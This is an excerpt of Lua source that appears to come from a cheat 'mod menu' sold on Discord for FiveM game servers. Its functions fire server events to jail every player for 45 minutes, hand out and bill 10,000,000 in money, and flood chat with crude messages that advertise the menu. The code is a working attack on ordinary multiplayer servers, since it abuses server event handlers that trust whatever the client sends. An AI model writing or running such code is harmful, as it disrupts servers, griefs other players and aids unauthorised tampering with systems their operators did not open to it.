...
function RapeAllFunc()
    for bs=0,9 do
        TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"^2The server just got fucked by ^1P^3r^4o^5x^6y ^1M^2e^3n^4u: https://discord.gg/ZQNyRcgcp3")
    end
end
    ...
    Citizen.CreateThread(function()
        ...
        for i=0,128 do
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, " Welcome *Proxy MODZ 2.2* buy Mod Menu in https://discord.gg/ZQNyRcgcp3")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, " Welcome *Proxy MODZ 2.2* buy Mod Menu in https://discord.gg/ZQNyRcgcp3")
				TriggerServerEvent("esx-qalle-jail:updateJailTime_n96nDDU@X?@zpf8", GetPlayerServerId(i), 45 * 60, " Welcome *Proxy MODZ 2.2* buy Mod Menu in https://discord.gg/ZQNyRcgcp3")
					end
				end
			...
			if esxdestroy then
				for i = 0, 128 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Best Proxy Menu 2.2 https://discord.gg/ZQNyRcgcp3", 10000000)
        ...
        if ci then
			...
			function vrpdestroy()
                for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        '^2The server just got fucked by ^1P^3r^4o^5x^6y ^1M^2e^3n^4u: https://discord.gg/ZQNyRcgcp3',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. '^2The server just got fucked by ^1P^3r^4o^5x^6y ^1M^2e^3n^4u: https://discord.gg/ZQNyRcgcp3'
                    )
                end
                TriggerServerEvent(
                    'lscustoms:payGarage',
...
drawNotification("~h~-» ~g~revive success!")
	...
	if sall then
			...
			if spam then
                ...
                TriggerServerEvent('_chat:messageEntered', '^2The server just got fucked by ^1P^3r^4o^5x^6y ^1M^2e^3n^4u: https://discord.gg/ZQNyRcgcp3', {0, 0x99, 255}, '^2The server just got fucked by ^1P^3r^4o^5x^6y ^1M^2e^3n^4u: https://discord.gg/ZQNyRcgcp3')
                end
			end
